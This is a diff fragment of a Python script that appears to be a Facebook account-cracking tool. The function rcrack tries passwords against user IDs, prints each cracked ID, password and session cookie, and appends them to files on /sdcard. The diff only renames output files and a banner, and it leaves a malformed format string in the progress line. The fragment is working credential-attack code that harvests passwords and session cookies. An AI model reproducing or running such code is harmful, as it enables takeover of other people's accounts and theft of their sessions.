@@ -395,18 +395,18 @@ def rcrack(uid,pwx,tl):
                 coki=";".join(i["name"]+"="+i["value"] for i in lo["session_cookies"])	
                 print(f"\033[1;32m❮✔❯ {uid} | {ps} ──≻> {possible_join_date(uid)}\n\033[1;97m❮COOKIE❯ = \033[1;97m{coki}")
                 linex()
-                open('/sdcard/MYAN-2-OK.txt', 'a').write(f"❮✔❯ {uid} | {ps} ──≻> {possible_join_date(uid)}\n❮COOKIE❯ = {coki}\n❮User-Agent❯ = {pro}\n\n")
+                open('/sdcard/WT4P-2-OK.txt', 'a').write(f"❮✔❯ {uid} | {ps} ──≻> {possible_join_date(uid)}\n❮COOKIE❯ = {coki}\n❮User-Agent❯ = {pro}\n\n")
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in str(lo):            	
                 print(f"\x1b[1;90m❮✘❯ {uid} | {ps}")
-                open('/sdcard/WT4P-1-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                open('/sdcard/WT4P-2-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break            
             else:
                 continue
         loop+=1 
-        sys.stdout.write(f'\r\r \033[1;32m〘%sMYAN-2\033[1;32m〙\033[1;34m\033[1;32m〘\033[38;5;195m%s/%s\033[1;32m〙\033[1;32mOK-%s\r'    %  (bi,loop,tl,len(oks)))
+        sys.stdout.write(f'\r\r \033[1;32m〘%WT4P-2\033[1;32m〙\033[1;34m\033[1;32m〘\033[38;5;195m%s/%s\033[1;32m〙\033[1;32mOK-%s\r'    %  (bi,loop,tl,len(oks)))
         sys.stdout.flush()
     except:
         pass
